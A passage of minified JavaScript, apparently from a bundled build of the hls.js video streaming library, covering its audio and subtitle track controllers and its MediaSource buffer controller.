Ua=Ea.endPTS,kb=Ea.startDTS,cb=Ea.endDTS;ya&&(ya.elementaryStreams[Eb.a.AUDIO]={startPTS:K,endPTS:Ua,startDTS:kb,endDTS:cb}),k.setElementaryStreamInfo(Eb.a.AUDIO,K,Ua,kb,cb),this.bufferFragmentData(Ea,k,ya,ea)}null!=Ha&&null!==(e=Ha.samples)&&void 0!==e&&e.length&&(e=ia({frag:k,id:"audio"},Ha),y.trigger(ua.a.FRAG_PARSING_METADATA,e)),sa&&(e=ia({frag:k,id:"audio"},sa),y.trigger(ua.a.FRAG_PARSING_USERDATA,e))}},n._bufferInitSegment=function(k,e,y){if("PARSING"===this.state){k.video&&delete k.video;var K=k.audio;K&&(K.levelCodec=K.codec,K.id="audio",this.log("Init audio buffer, container:"+K.container+", codecs[parsed]=["+K.codec+"]"),this.hls.trigger(ua.a.BUFFER_CODECS,k),null!=(k=K.initSegment)&&k.byteLength&&this.hls.trigger(ua.a.BUFFER_APPENDING,{type:"audio",frag:e,part:null,chunkMeta:y,parent:e.type,data:k}),this.tick())}},n.loadFragment=function(k,e,y){var K=this.fragmentTracker.getState(k);this.fragCurrent=k,(this.audioSwitch||K===Ia.NOT_LOADED||K===Ia.PARTIAL)&&("initSegment"===k.sn?this._loadInitSegment(k):e.live&&!Object($a.a)(this.initPTS[k.cc])?(this.log("Waiting for video PTS in continuity counter "+k.cc+" of live stream before loading audio fragment "+k.sn+" of level "+this.trackId),this.state="WAITING_INIT_PTS"):(this.startFragRequested=!0,ta.prototype.loadFragment.call(this,k,e,y)))},n.completeAudioSwitch=function(){var k=this.hls,e=this.trackId;this.media&&(this.log("Switching audio track : flushing all audio"),ta.prototype.flushMainBuffer.call(this,0,Number.POSITIVE_INFINITY,"audio")),this.audioSwitch=!1,k.trigger(ua.a.AUDIO_TRACK_SWITCHED,{id:e})},ca}(mc),je=function(ta){function ca(e){var y;return(y=ta.call(this,e,"[audio-track-controller]")||this).tracks=[],y.groupId=null,y.tracksInGroup=[],y.trackId=-1,y.trackName="",y.selectDefaultTrack=!0,y.registerListeners(),y}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,oa(ca,ta);var n,k=ca.prototype;return k.registerListeners=function(){var e=this.hls;e.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),e.on(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.on(ua.a.LEVEL_LOADING,this.onLevelLoading,this),e.on(ua.a.LEVEL_SWITCHING,this.onLevelSwitching,this),e.on(ua.a.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),e.on(ua.a.ERROR,this.onError,this)},k.unregisterListeners=function(){var e=this.hls;e.off(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),e.off(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.off(ua.a.LEVEL_LOADING,this.onLevelLoading,this),e.off(ua.a.LEVEL_SWITCHING,this.onLevelSwitching,this),e.off(ua.a.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),e.off(ua.a.ERROR,this.onError,this)},k.destroy=function(){this.unregisterListeners(),this.tracks.length=0,this.tracksInGroup.length=0,ta.prototype.destroy.call(this)},k.onManifestLoading=function(){this.tracks=[],this.groupId=null,this.tracksInGroup=[],this.trackId=-1,this.trackName="",this.selectDefaultTrack=!0},k.onManifestParsed=function(e,y){this.tracks=y.audioTracks||[]},k.onAudioTrackLoaded=function(e,y){e=y.id;var K=y.details,ea=this.tracksInGroup[e];if(ea){var sa=ea.details;ea.details=y.details,this.log("audioTrack "+e+" loaded ["+K.startSN+"-"+K.endSN+"]"),e===this.trackId&&(this.retryCount=0,this.playlistLoaded(e,y,sa))}else this.warn("Invalid audio track id "+e)},k.onLevelLoading=function(e,y){this.switchLevel(y.level)},k.onLevelSwitching=function(e,y){this.switchLevel(y.level)},k.switchLevel=function(e){if(null!=(e=this.hls.levels[e])&&e.audioGroupIds){var y=e.audioGroupIds[e.urlId];if(this.groupId!==y){this.groupId=y,e=this.tracks.filter((function(ea){return!y||ea.groupId===y})),this.selectDefaultTrack&&!e.some((function(ea){return ea.default}))&&(this.selectDefaultTrack=!1),this.tracksInGroup=e;var K={audioTracks:e};this.log("Updating audio tracks, "+e.length+' track(s) found in "'+y+'" group-id'),this.hls.trigger(ua.a.AUDIO_TRACKS_UPDATED,K),this.selectInitialTrack()}}},k.onError=function(e,y){ta.prototype.onError.call(this,e,y),!y.fatal&&y.context&&y.context.type===ob.AUDIO_TRACK&&y.context.id===this.trackId&&y.context.groupId===this.groupId&&this.retryLoadingOrFail(y)},k.setAudioTrack=function(e){var y=this.tracksInGroup;if(0>e||e>=y.length)this.warn("Invalid id passed to audio-track controller");else{this.clearTimer();var K=y[this.trackId];this.log("Now switching to audio-track index "+e);var ea=(y=y[e]).id,sa=y.groupId,ya=y.name,Ea=y.type,Ha=y.url;this.trackId=e,this.trackName=ya,this.selectDefaultTrack=!1,this.hls.trigger(ua.a.AUDIO_TRACK_SWITCHING,{id:ea,groupId:void 0===sa?"":sa,name:ya,type:Ea,url:Ha}),(!y.details||y.details.live)&&(e=this.switchParams(y.url,null==K?void 0:K.details),this.loadPlaylist(e))}},k.selectInitialTrack=function(){this.tracksInGroup;var e=this.findTrackId(this.trackName)||this.findTrackId();-1!==e?this.setAudioTrack(e):(this.warn("No track found for running audio group-ID: "+this.groupId),this.hls.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.AUDIO_TRACK_LOAD_ERROR,fatal:!0}))},k.findTrackId=function(e){for(var y=this.tracksInGroup,K=0;K<y.length;K++){var ea=y[K];if(!(this.selectDefaultTrack&&!ea.default||e&&e!==ea.name))return ea.id}return-1},k.loadPlaylist=function(e){var y=this.tracksInGroup[this.trackId];if(this.shouldLoadTrack(y)){var K=y.id,ea=y.groupId;if(y=y.url,e)try{y=e.addDirectives(y)}catch(sa){this.warn("Could not construct new URL with HLS Delivery Directives: "+sa)}this.log("loading audio-track playlist for id: "+K),this.clearTimer(),this.hls.trigger(ua.a.AUDIO_TRACK_LOADING,{url:y,id:K,groupId:ea,deliveryDirectives:e||null})}},n=[{key:"audioTracks",get:function(){return this.tracksInGroup}},{key:"audioTrack",get:function(){return this.trackId},set:function(e){this.selectDefaultTrack=!1,this.setAudioTrack(e)}}],function V(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ca.prototype,n),ca}(Wb),Qd=function(ta){function ca(e,y){var K;return(K=ta.call(this,e,y,"[subtitle-stream-controller]")||this).levels=[],K.currentTrackId=-1,K.tracksBuffered=void 0,K.config=e.config,K.fragCurrent=null,K.fragPrevious=null,K.media=null,K.mediaBuffer=null,K.state="STOPPED",K.tracksBuffered=[],K._registerListeners(),K}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,ha(ca,ta);var n,k=ca.prototype;return k._registerListeners=function(){var e=this.hls;e.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),e.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),e.on(ua.a.ERROR,this.onError,this),e.on(ua.a.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),e.on(ua.a.SUBTITLE_TRACK_SWITCH,this.onSubtitleTrackSwitch,this),e.on(ua.a.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),e.on(ua.a.SUBTITLE_FRAG_PROCESSED,this.onSubtitleFragProcessed,this)},k._unregisterListeners=function(){var e=this.hls;e.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),e.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),e.off(ua.a.ERROR,this.onError,this),e.off(ua.a.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),e.off(ua.a.SUBTITLE_TRACK_SWITCH,this.onSubtitleTrackSwitch,this),e.off(ua.a.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),e.off(ua.a.SUBTITLE_FRAG_PROCESSED,this.onSubtitleFragProcessed,this)},k.startLoad=function(){this.stopLoad(),this.state="IDLE";var e=this.levels[this.currentTrackId];null!=e&&e.details&&(this.setInterval(500),this.tick())},k.onHandlerDestroyed=function(){this.state="STOPPED",this._unregisterListeners(),ta.prototype.onHandlerDestroyed.call(this)},k.onSubtitleFragProcessed=function(e,y){if(e=y.frag,y=y.success,this.fragPrevious=e,this.state="IDLE",y&&(y=this.tracksBuffered[this.currentTrackId])){for(var K,ea=e.start,sa=0;sa<y.length;sa++)if(ea>=y[sa].start&&ea<=y[sa].end){K=y[sa];break}e=e.start+e.duration,K?K.end=e:(K={start:ea,end:e},y.push(K))}},k.onMediaAttached=function(e,y){this.media=y.media,this.state="IDLE"},k.onMediaDetaching=function(){var e=this;this.media&&(this.fragmentTracker.removeAllFragments(),this.fragPrevious=null,this.currentTrackId=-1,this.levels.forEach((function(y){e.tracksBuffered[y.id]=[]})),this.media=null,this.mediaBuffer=null,this.state="STOPPED")},k.onError=function(e,y){var K;(e=y.frag)&&e.type===lb.SUBTITLE&&(null!==(K=this.fragCurrent)&&void 0!==K&&K.loader&&this.fragCurrent.loader.abort(),this.state="IDLE")},k.onSubtitleTracksUpdated=function(e,y){var K=this;e=y.subtitleTracks,this.tracksBuffered=[],this.levels=e.map((function(ea){return new Fb(ea)})),this.fragmentTracker.removeAllFragments(),this.fragPrevious=null,this.levels.forEach((function(ea){K.tracksBuffered[ea.id]=[]})),this.mediaBuffer=null},k.onSubtitleTrackSwitch=function(e,y){this.currentTrackId=y.id,this.levels.length&&-1!==this.currentTrackId?null!=(e=this.levels[this.currentTrackId])&&e.details?(this.mediaBuffer=this.mediaBufferTimeRanges,this.setInterval(500)):this.mediaBuffer=null:this.clearInterval()},k.onSubtitleTrackLoaded=function(e,y){var K;e=y.id,y=y.details;var ea=this.currentTrackId,sa=this.levels;if(sa.length&&y){var ya=sa[ea];if(!(e>=sa.length||e!==ea)&&ya){if(this.mediaBuffer=this.mediaBufferTimeRanges,y.live||null!==(K=ya.details)&&void 0!==K&&K.live){if(y.deltaUpdateFailed)return;this.alignPlaylists(y,ya.details)}ya.details=y,this.levelLastLoaded=e,this.setInterval(500)}}},k._handleFragmentLoadComplete=function(e){var y=e.frag;e=e.payload;var K=y.decryptdata,ea=this.hls;if(!this.fragContextChanged(y)&&e&&0<e.byteLength&&K&&K.key&&K.iv&&"AES-128"===K.method){var sa=performance.now();this.decrypter.webCryptoDecrypt(new Uint8Array(e),K.key.buffer,K.iv.buffer).then((function(ya){var Ea=performance.now();ea.trigger(ua.a.FRAG_DECRYPTED,{frag:y,payload:ya,stats:{tstart:sa,tdecrypt:Ea}})}))}},k.doTick=function(){if(this.media){if("IDLE"===this.state){var e,y=this.config,K=this.currentTrackId,ea=this.fragmentTracker,sa=this.levels;if(sa.length&&sa[K]&&sa[K].details){var Ua,ya=y.maxFragLookUpTolerance,Ea=Math.min(y.maxBufferLength,y.maxMaxBufferLength),Ha=dc.bufferedInfo(this.mediaBufferTimeRanges,this.media.currentTime,y.maxBufferHole);y=Ha.end,Ha.len>Ea||(Ea=(sa=(K=sa[K].details).fragments).length,Ha=this.fragPrevious,y<sa[Ea-1].start+sa[Ea-1].duration?(Ha&&K.hasProgramDateTime&&(Ua=R(sa,Ha.endProgramDateTime,ya)),Ua||(Ua=Q(Ha,sa,y,ya))):Ua=sa[Ea-1],null!==(e=Ua)&&void 0!==e&&e.encrypted?(Fa.b.log("Loading key for "+Ua.sn),this.state="KEY_LOADING",this.hls.trigger(ua.a.KEY_LOADING,{frag:Ua})):Ua&&ea.getState(Ua)===Ia.NOT_LOADED&&this.loadFragment(Ua,K,y))}}}else this.state="IDLE"},k.loadFragment=function(e,y,K){this.fragCurrent=e,ta.prototype.loadFragment.call(this,e,y,K)},k.stopLoad=function(){this.fragPrevious=null,ta.prototype.stopLoad.call(this)},n=[{key:"mediaBufferTimeRanges",get:function(){return this.tracksBuffered[this.currentTrackId]||[]}}],function ba(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ca.prototype,n),ca}(mc),ke=function(ta){function ca(e){var y;return(y=ta.call(this,e,"[subtitle-track-controller]")||this).media=null,y.tracks=[],y.groupId=null,y.tracksInGroup=[],y.trackId=-1,y.selectDefaultTrack=!0,y.queuedDefaultTrack=-1,y.trackChangeListener=function(){return y.onTextTracksChanged()},y.useTextTrackPolling=!1,y.subtitlePollingInterval=-1,y.subtitleDisplay=!0,y.registerListeners(),y}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,la(ca,ta);var n,k=ca.prototype;return k.destroy=function(){this.unregisterListeners(),this.tracks.length=0,this.tracksInGroup.length=0,this.trackChangeListener=null,ta.prototype.destroy.call(this)},k.registerListeners=function(){var e=this.hls;e.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),e.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),e.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),e.on(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.on(ua.a.LEVEL_LOADING,this.onLevelLoading,this),e.on(ua.a.LEVEL_SWITCHING,this.onLevelSwitching,this),e.on(ua.a.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),e.on(ua.a.ERROR,this.onError,this)},k.unregisterListeners=function(){var e=this.hls;e.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),e.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),e.off(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),e.off(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.off(ua.a.LEVEL_LOADING,this.onLevelLoading,this),e.off(ua.a.LEVEL_SWITCHING,this.onLevelSwitching,this),e.off(ua.a.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),e.off(ua.a.ERROR,this.onError,this)},k.onMediaAttached=function(e,y){var K=this;(this.media=y.media)&&(-1<this.queuedDefaultTrack&&(this.subtitleTrack=this.queuedDefaultTrack,this.queuedDefaultTrack=-1),this.useTextTrackPolling=!(this.media.textTracks&&"onchange"in this.media.textTracks),this.useTextTrackPolling?(self.clearInterval(this.subtitlePollingInterval),this.subtitlePollingInterval=self.setInterval((function(){K.trackChangeListener()}),500)):this.media.textTracks.addEventListener("change",this.trackChangeListener))},k.onMediaDetaching=function(){this.media&&(this.useTextTrackPolling?self.clearInterval(this.subtitlePollingInterval):this.media.textTracks.removeEventListener("change",this.trackChangeListener),-1<this.trackId&&(this.queuedDefaultTrack=this.trackId),C(this.media.textTracks).forEach((function(e){l(e)})),this.subtitleTrack=-1,this.media=null)},k.onManifestLoading=function(){this.tracks=[],this.groupId=null,this.tracksInGroup=[],this.trackId=-1,this.selectDefaultTrack=!0},k.onManifestParsed=function(e,y){this.tracks=y.subtitleTracks},k.onSubtitleTrackLoaded=function(e,y){e=y.id;var K=y.details,ea=this.tracksInGroup[this.trackId];if(ea){var sa=ea.details;ea.details=y.details,this.log("subtitle track "+e+" loaded ["+K.startSN+"-"+K.endSN+"]"),e===this.trackId&&(this.retryCount=0,this.playlistLoaded(e,y,sa))}else this.warn("Invalid subtitle track id "+e)},k.onLevelLoading=function(e,y){this.switchLevel(y.level)},k.onLevelSwitching=function(e,y){this.switchLevel(y.level)},k.switchLevel=function(e){if(null!=(e=this.hls.levels[e])&&e.textGroupIds){var y=e.textGroupIds[e.urlId];if(this.groupId!==y){e=this.tracksInGroup?this.tracksInGroup[this.trackId]:void 0;var K=this.findTrackId(null==e?void 0:e.name)||this.findTrackId(),ea=this.tracks.filter((function(ya){return!y||ya.groupId===y}));this.groupId=y,this.tracksInGroup=ea;var sa={subtitleTracks:ea};this.log("Updating subtitle tracks, "+ea.length+' track(s) found in "'+y+'" group-id'),this.hls.trigger(ua.a.SUBTITLE_TRACKS_UPDATED,sa),-1!==K&&this.setSubtitleTrack(K,e)}}},k.findTrackId=function(e){for(var y=this.tracksInGroup,K=0;K<y.length;K++){var ea=y[K];if(!(this.selectDefaultTrack&&!ea.default||e&&e!==ea.name))return ea.id}return-1},k.onError=function(e,y){ta.prototype.onError.call(this,e,y),!y.fatal&&y.context&&y.context.type===ob.SUBTITLE_TRACK&&y.context.id===this.trackId&&y.context.groupId===this.groupId&&this.retryLoadingOrFail(y)},k.loadPlaylist=function(e){var y=this.tracksInGroup[this.trackId];if(this.shouldLoadTrack(y)){var K=y.id,ea=y.groupId;if(y=y.url,e)try{y=e.addDirectives(y)}catch(sa){this.warn("Could not construct new URL with HLS Delivery Directives: "+sa)}this.log("Loading subtitle playlist for id "+K),this.hls.trigger(ua.a.SUBTITLE_TRACK_LOADING,{url:y,id:K,groupId:ea,deliveryDirectives:e||null})}},k.toggleTrackModes=function(e){var y=this,K=this.media,ea=this.subtitleDisplay,sa=this.trackId;if(K){var ya=C(K.textTracks);K=ya.filter((function(Ea){return Ea.groupId===y.groupId})),-1===e?[].slice.call(ya).forEach((function(Ea){Ea.mode="disabled"})):(sa=K[sa])&&(sa.mode="disabled"),(e=K[e])&&(e.mode=ea?"showing":"hidden")}},k.setSubtitleTrack=function(e,y){var K,ea=this.tracksInGroup;this.media?(this.trackId!==e&&this.toggleTrackModes(e),this.trackId===e&&(-1===e||null!==(K=ea[e])&&void 0!==K&&K.details)||-1>e||e>=ea.length||(this.clearTimer(),K=ea[e],this.log("Switching to subtitle track "+e),this.trackId=e,K?(e=K.groupId,this.hls.trigger(ua.a.SUBTITLE_TRACK_SWITCH,{id:K.id,groupId:void 0===e?"":e,name:K.name,type:K.type,url:K.url}),y=this.switchParams(K.url,null==y?void 0:y.details),this.loadPlaylist(y)):this.hls.trigger(ua.a.SUBTITLE_TRACK_SWITCH,{id:e}))):this.queuedDefaultTrack=e},k.onTextTracksChanged=function(){if(this.media&&this.hls.config.renderTextTracksNatively){for(var e=-1,y=C(this.media.textTracks),K=0;K<y.length;K++)if("hidden"===y[K].mode)e=K;else if("showing"===y[K].mode){e=K;break}this.subtitleTrack=e}},n=[{key:"subtitleTracks",get:function(){return this.tracksInGroup}},{key:"subtitleTrack",get:function(){return this.trackId},set:function(e){this.selectDefaultTrack=!1,this.setSubtitleTrack(e,this.tracksInGroup?this.tracksInGroup[this.trackId]:void 0)}}],function ka(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ca.prototype,n),ca}(Wb),le=function(){function ta(n){this.queues={video:[],audio:[],audiovideo:[]},this.buffers=n}var ca=ta.prototype;return ca.append=function(n,k){var e=this.queues[k];e.push(n),1===e.length&&this.buffers[k]&&this.executeNext(k)},ca.insertAbort=function(n,k){this.queues[k].unshift(n),this.executeNext(k)},ca.appendBlocker=function(n){var k,e=new Promise((function(y){k=y}));return this.append({execute:k,onStart:function(){},onComplete:function(){},onError:function(){}},n),e},ca.executeNext=function(n){var k=this.buffers[n];if((n=this.queues[n]).length){var e=n[0];try{e.execute()}catch(y){Fa.b.warn("[buffer-operation-queue]: Unhandled exception executing the current operation"),e.onError(y),k&&k.updating||n.shift()}}},ca.shiftAndExecuteNext=function(n){this.queues[n].shift(),this.executeNext(n)},ca.current=function(n){return this.queues[n][0]},ta}(),Hd=self.MediaSource||self.WebKitMediaSource,Rd=/([ha]vc.)(?:\.[^.,]+)+/,xd=function(){function ta(n){var k=this;this._objectUrl=this.details=null,this.hls=this.listeners=this.operationQueue=void 0,this._bufferCodecEventsTotal=this.bufferCodecEventsExpected=0,this.mediaSource=this.media=null,this.appendError=0,this.tracks={},this.pendingTracks={},this.sourceBuffer=void 0,this._onMediaSourceOpen=function(){var e=k.hls,y=k.media,K=k.mediaSource;Fa.b.log("[buffer-controller]: Media source opened"),y&&(k.updateMediaElementDuration(),e.trigger(ua.a.MEDIA_ATTACHED,{media:y})),K&&K.removeEventListener("sourceopen",k._onMediaSourceOpen),k.checkPendingTracks()},this._onMediaSourceClose=function(){Fa.b.log("[buffer-controller]: Media source closed")},this._onMediaSourceEnded=function(){Fa.b.log("[buffer-controller]: Media source ended")},this.hls=n,this._initSourceBuffer(),this.registerListeners()}var ca=ta.prototype;return ca.hasSourceTypes=function(){return 0<this.getSourceBufferTypes().length||0<Object.keys(this.pendingTracks).length},ca.destroy=function(){this.unregisterListeners(),this.details=null},ca.registerListeners=function(){var n=this.hls;n.on(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this),n.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),n.on(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),n.on(ua.a.BUFFER_RESET,this.onBufferReset,this),n.on(ua.a.BUFFER_APPENDING,this.onBufferAppending,this),n.on(ua.a.BUFFER_CODECS,this.onBufferCodecs,this),n.on(ua.a.BUFFER_EOS,this.onBufferEos,this),n.on(ua.a.BUFFER_FLUSHING,this.onBufferFlushing,this),n.on(ua.a.LEVEL_UPDATED,this.onLevelUpdated,this),n.on(ua.a.FRAG_PARSED,this.onFragParsed,this),n.on(ua.a.FRAG_CHANGED,this.onFragChanged,this)},ca.unregisterListeners=function(){var n=this.hls;n.off(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this),n.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),n.off(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),n.off(ua.a.BUFFER_RESET,this.onBufferReset,this),n.off(ua.a.BUFFER_APPENDING,this.onBufferAppending,this),n.off(ua.a.BUFFER_CODECS,this.onBufferCodecs,this),n.off(ua.a.BUFFER_EOS,this.onBufferEos,this),n.off(ua.a.BUFFER_FLUSHING,this.onBufferFlushing,this),n.off(ua.a.LEVEL_UPDATED,this.onLevelUpdated,this),n.off(ua.a.FRAG_PARSED,this.onFragParsed,this),n.off(ua.a.FRAG_CHANGED,this.onFragChanged,this)},ca._initSourceBuffer=function(){this.sourceBuffer={},this.operationQueue=new le(this.sourceBuffer),this.listeners={audio:[],video:[],audiovideo:[]}},ca.onManifestParsed=function(n,k){n=2,(k.audio&&!k.video||!k.altAudio)&&(n=1),this.bufferCodecEventsExpected=this._bufferCodecEventsTotal=n,this.details=null,Fa.b.log(this.bufferCodecEventsExpected+" bufferCodec event(s) expected")},ca.onMediaAttaching=function(n,k){(n=this.media=k.media)&&Hd&&((k=this.mediaSource=new Hd).addEventListener("sourceopen",this._onMediaSourceOpen),k.addEventListener("sourceended",this._onMediaSourceEnded),k.addEventListener("sourceclose",this._onMediaSourceClose),n.src=self.URL.createObjectURL(k),this._objectUrl=n.src)},ca.onMediaDetaching=function(){var n=this.media,k=this.mediaSource,e=this._objectUrl;if(k){if(Fa.b.log("[buffer-controller]: media source detaching"),"open"===k.readyState)try{k.endOfStream()}catch(y){Fa.b.warn("[buffer-controller]: onMediaDetaching: "+y.message+" while calling endOfStream")}this.onBufferReset(),k.removeEventListener("sourceopen",this._onMediaSourceOpen),k.removeEventListener("sourceended",this._onMediaSourceEnded),k.removeEventListener("sourceclose",this._onMediaSourceClose),n&&(e&&self.URL.revokeObjectURL(e),n.src===e?(n.removeAttribute("src"),n.load()):Fa.b.warn("[buffer-controller]: media.src was changed by a third party - skip cleanup")),this._objectUrl=this.media=this.mediaSource=null,this.bufferCodecEventsExpected=this._bufferCodecEventsTotal,this.pendingTracks={},this.tracks={}}this.hls.trigger(ua.a.MEDIA_DETACHED,void 0)},ca.onBufferReset=function(){var n=this,k=this.sourceBuffer;this.getSourceBufferTypes().forEach((function(e){var y=k[e];try{y&&(n.removeBufferListeners(e),n.mediaSource&&n.mediaSource.removeSourceBuffer(y),k[e]=void 0)}catch(K){Fa.b.warn("[buffer-controller]: Failed to reset the "+e+" buffer",K)}})),this._initSourceBuffer()},ca.onBufferCodecs=function(n,k){var e=this,y=Object.keys(this.sourceBuffer).length;Object.keys(k).forEach((function(K){if(y){var ea=e.tracks[K];if(ea&&"function"==typeof ea.buffer.changeType){var sa=k[K],ya=sa.codec,Ea=sa.levelCodec;sa=sa.container,(ea.levelCodec||ea.codec).replace(Rd,"$1")!==(Ea||ya).replace(Rd,"$1")&&e.appendChangeType(K,sa+";codecs="+(Ea||ya))}}else e.pendingTracks[K]=k[K]})),y||(this.bufferCodecEventsExpected=Math.max(this.bufferCodecEventsExpected-1,0),this.mediaSource&&"open"===this.mediaSource.readyState&&this.checkPendingTracks())},ca.appendChangeType=function(n,k){var e=this,y=this.operationQueue;y.append({execute:function(){var K=e.sourceBuffer[n];K&&(Fa.b.log("[buffer-controller]: changing "+n+" sourceBuffer type to "+k),K.changeType(k)),y.shiftAndExecuteNext(n)},onStart:function(){},onComplete:function(){},onError:function(K){Fa.b.warn("[buffer-controller]: Failed to change "+n+" SourceBuffer type",K)}},n)},ca.onBufferAppending=function(n,k){var e=this,y=this.hls;n=this.operationQueue;var K=this.tracks,ea=k.data,sa=k.type,ya=k.frag,Ea=k.part,Ha=k.chunkMeta,Ua=Ha.buffering[sa];k=self.performance.now(),Ua.start=k;var kb=ya.stats.buffering,cb=Ea?Ea.stats.buffering:null;0===kb.start&&(kb.start=k),cb&&0===cb.start&&(cb.start=k),k=K.audio;var ub="audio"===sa&&1===Ha.id&&"audio/mpeg"===(null==k?void 0:k.container);n.append({execute:function(){if(Ua.executeStart=self.performance.now(),ub){var gb=e.sourceBuffer[sa];if(gb){var Gb=ya.start-gb.timestampOffset;.1<=Math.abs(Gb)&&(Fa.b.log("[buffer-controller]: Updating audio SourceBuffer timestampOffset to "+ya.start+" (delta: "+Gb+") sn: "+ya.sn+")"),gb.timestampOffset=ya.start)}}e.appendExecutor(ea,sa)},onStart:function(){},onComplete:function(){var gb=self.performance.now();Ua.executeEnd=Ua.end=gb,0===kb.first&&(kb.first=gb),cb&&0===cb.first&&(cb.first=gb),gb=e.sourceBuffer;var wb,Gb={};for(wb in gb)Gb[wb]=dc.getBuffered(gb[wb]);e.appendError=0,e.hls.trigger(ua.a.BUFFER_APPENDED,{type:sa,frag:ya,part:Ea,chunkMeta:Ha,parent:ya.type,timeRanges:Gb})},onError:function(gb){Fa.b.error("[buffer-controller]: Error encountered while trying to append to the "+sa+" SourceBuffer",gb);var Gb={type:Ka.b.MEDIA_ERROR,parent:ya.type,details:Ka.a.BUFFER_APPEND_ERROR,err:gb,fatal:!1};gb.code===DOMException.QUOTA_EXCEEDED_ERR?Gb.details=Ka.a.BUFFER_FULL_ERROR:(e.appendError++,Gb.details=Ka.a.BUFFER_APPEND_ERROR,e.appendError>y.config.appendErrorMaxRetry&&(Fa.b.error("[buffer-controller]: Failed "+y.config.appendErrorMaxRetry+" times to append segment in sourceBuffer"),Gb.fatal=!0)),y.trigger(ua.a.ERROR,Gb)}},sa)},ca.onBufferFlushing=function(n,k){var e=this;n=this.operationQueue;var y=function(K){return{execute:e.removeExecutor.bind(e,K,k.startOffset,k.endOffset),onStart:function(){},onComplete:function(){e.hls.trigger(ua.a.BUFFER_FLUSHED,{type:K})},onError:function(ea){Fa.b.warn("[buffer-controller]: Failed to remove from "+K+" SourceBuffer",ea)}}};k.type?n.append(y(k.type),k.type):(n.append(y("audio"),"audio"),n.append(y("video"),"video"))},ca.onFragParsed=function(n,k){var e=this,y=k.frag,K=k.part;n=[],(k=K?K.elementaryStreams:y.elementaryStreams)[Eb.a.AUDIOVIDEO]?n.push("audiovideo"):(k[Eb.a.AUDIO]&&n.push("audio"),k[Eb.a.VIDEO]&&n.push("video")),0===n.length&&Fa.b.warn("Fragments must have at least one ElementaryStreamType set. type: "+y.type+" level: "+y.level+" sn: "+y.sn),this.blockBuffers((function(){var ea=self.performance.now();y.stats.buffering.end=ea,K&&(K.stats.buffering.end=ea),e.hls.trigger(ua.a.FRAG_BUFFERED,{frag:y,part:K,stats:K?K.stats:y.stats,id:y.type})}),n)},ca.onFragChanged=function(n,k){this.flushBackBuffer()},ca.onBufferEos=function(n,k){var e=this;this.getSourceBufferTypes().reduce((function(y,K){var ea=e.sourceBuffer[K];return k.type&&k.type!==K||ea&&!ea.ended&&(ea.ended=!0,Fa.b.log("[buffer-controller]: "+K+" sourceBuffer now EOS")),y&&!(ea&&!ea.ended)}),!0)&&this.blockBuffers((function(){var y=e.mediaSource;y&&"open"===y.readyState&&y.endOfStream()}))},ca.onLevelUpdated=function(n,k){(n=k.details).fragments.length&&(this.details=n,this.getSourceBufferTypes().length?this.blockBuffers(this.updateMediaElementDuration.bind(this)):this.updateMediaElementDuration())},ca.flushBackBuffer=function(){var n=this.hls,k=this.details,e=this.media,y=this.sourceBuffer;if(e&&null!==k){var K=this.getSourceBufferTypes();if(K.length){var ea=k.live&&null!==n.config.liveBackBufferLength?n.config.liveBackBufferLength:n.config.backBufferLength;if(Object($a.a)(ea)&&!(0>ea)){var sa=k.levelTargetDuration,ya=Math.floor(e.currentTime/sa)*sa-Math.max(ea,sa);K.forEach((function(Ea){var Ha=y[Ea];Ha&&0<(Ha=dc.getBuffered(Ha)).length&&ya>Ha.start(0)&&(n.trigger(ua.a.BACK_BUFFER_REACHED,{bufferEnd:ya}),k.live&&n.trigger(ua.a.LIVE_BACK_BUFFER_REACHED,{bufferEnd:ya}),n.trigger(ua.a.BUFFER_FLUSHING,{startOffset:0,endOffset:ya,type:Ea}))}))}}}},ca.updateMediaElementDuration=function(){if(this.details&&this.media&&this.mediaSource&&"open"===this.mediaSource.readyState){var 